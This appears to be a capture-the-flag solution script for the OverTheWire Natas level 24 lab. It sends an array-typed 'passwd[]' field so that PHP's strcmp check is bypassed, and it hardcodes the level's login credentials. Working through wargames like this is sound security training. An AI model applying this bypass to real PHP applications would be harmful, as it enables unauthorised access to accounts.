strcmp

```
#!/usr/bin/env python
import requests
import re

username = 'natas24'
password = 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()
response = session.post(url, data = {'passwd[]':'shark'}, auth=(username,password))
content = response.text

print(content)
```
